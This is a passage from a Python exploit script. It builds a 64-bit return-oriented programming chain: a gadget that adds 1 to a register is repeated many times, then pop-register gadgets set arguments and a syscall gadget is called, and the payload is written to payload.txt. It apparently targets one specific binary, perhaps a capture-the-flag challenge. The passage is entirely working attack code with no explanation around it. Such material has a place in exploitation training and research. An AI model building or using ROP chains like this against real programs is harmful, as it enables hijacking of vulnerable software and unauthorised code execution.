	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x401616)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x6ca094)
	payload += struct.pack('<Q', 0x401737)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x0)
	payload += struct.pack('<Q', 0x442b16)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x0)
	payload += struct.pack('<Q', 0x467635)		# Address of syscall
	
	fd = open('payload.txt', 'wb')
	fd.write(payload)
	fd.close()
	